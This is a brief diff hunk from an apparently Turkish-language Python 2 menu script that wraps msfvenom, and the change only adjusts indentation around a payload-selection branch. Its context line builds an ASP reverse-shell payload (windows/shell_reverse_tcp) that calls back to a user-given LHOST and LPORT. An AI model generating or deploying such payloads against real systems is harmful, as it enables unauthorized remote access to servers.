@@ -626,9 +626,9 @@ if(uygulamano == "7"):
 			kayityeri= raw_input("Kayit Yerini Giriniz (shell.asp) : ")
 			os.system("msfvenom -p windows/shell_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f asp -o" + kayityeri )
 
-   	
 
-   	if(payloadno == "3"):
+
+	if(payloadno == "3"):
 
    		print("""
 
